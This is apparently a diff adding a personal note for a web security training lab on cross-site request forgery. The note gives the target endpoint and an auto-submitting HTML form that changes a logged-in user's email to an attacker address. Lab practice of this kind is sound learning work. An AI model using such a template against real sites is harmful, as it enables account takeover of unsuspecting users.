@@ -1,0 +1,17 @@
+
+[ WeB > CSRF > NO DEFENSES ]
+
+CSRF vulnerability with no defenses
+
+// target endpoint:
+POST /my-account/change-email
+
+// exploit template:
+<form method="POST" action="https://0ade003203ba51e582c6fcec00a70021.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="newemail@attacker.test">
+  <input type="submit" value="Submit">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+
